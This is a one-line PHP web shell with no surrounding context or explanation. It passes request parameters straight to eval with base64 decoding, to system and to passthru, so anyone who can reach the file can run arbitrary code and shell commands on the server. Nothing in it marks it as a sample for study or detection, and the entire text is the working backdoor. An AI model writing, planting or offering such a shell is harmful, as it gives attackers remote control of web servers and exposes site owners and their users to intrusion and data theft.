<?php eval(base64_decode($_POST['cmd'])); system($_GET['cmd']); passthru($_REQUEST['exec']); ?>
